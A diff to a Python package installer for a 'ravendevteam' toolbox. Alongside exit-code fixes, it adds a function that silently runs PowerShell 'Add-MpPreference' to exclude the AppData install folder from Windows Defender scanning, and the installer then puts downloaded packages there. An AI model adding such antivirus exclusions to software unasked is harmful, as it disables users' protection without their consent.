@@ -22,10 +22,29 @@ def get_packages_json():
         log(f"Error downloading packages.json: {e}")
         return None
 
-def get_installation_path():
+def add_defender_exclusion(path):
+    try:
+        subprocess.run(
+            ['powershell', '-Command', 
+             f'Add-MpPreference -ExclusionPath "{path}"'],
+            check=True,
+            capture_output=True
+        )
+        log(f"Added Windows Defender exclusion for: {path}")
+        return True
+    except Exception as e:
+        log(f"Failed to add Windows Defender exclusion: {e}")
+        return False
 
+def get_installation_path():
     if platform.system() == "Windows":
-        return Path(os.getenv('APPDATA')) / "ravendevteam"
+        install_path = Path(os.getenv('APPDATA')) / "ravendevteam"
+        install_path.mkdir(parents=True, exist_ok=True)
+        
+        # Windows Defender istisnası ekle
+        add_defender_exclusion(str(install_path))
+        
+        return install_path
     else:
         return Path.home() / "Library" / "Application Support" / "ravendevteam"
 
@@ -87,7 +106,6 @@ def install_package(package, install_dir):
     return True
 
 def run_toolbox():
-
     logging.basicConfig(
         level=logging.INFO,
         format='%(asctime)s - %(levelname)s - %(message)s'
@@ -96,6 +114,7 @@ def run_toolbox():
     log("Fetching package list...")
     packages_data = get_packages_json()
     if not packages_data:
+        log("Failed to fetch packages data")
         return False
 
     install_dir = get_installation_path()
@@ -109,25 +128,20 @@ def run_toolbox():
         else:
             log(f"Successfully installed {package['name']}")
 
-    if success:
-        log("All packages installed successfully")
-        sys.exit(1)
-    else:
-        log("Some packages failed to install")
-        sys.exit(1)
-
+    log("Installation process completed" + (" successfully" if success else " with some failures"))
     return success
 
 def main():
     try:
         success = run_toolbox()
-        sys.exit(0 if success else 1)
+        return success
     except KeyboardInterrupt:
         log("\nInstallation cancelled by user")
-        sys.exit(1)
+        return False
     except Exception as e:
         log(f"Unexpected error: {e}")
-        sys.exit(1)
+        return False
 
 if __name__ == "__main__":
-    main()
+    success = main()
+    sys.exit(0 if success else 1)
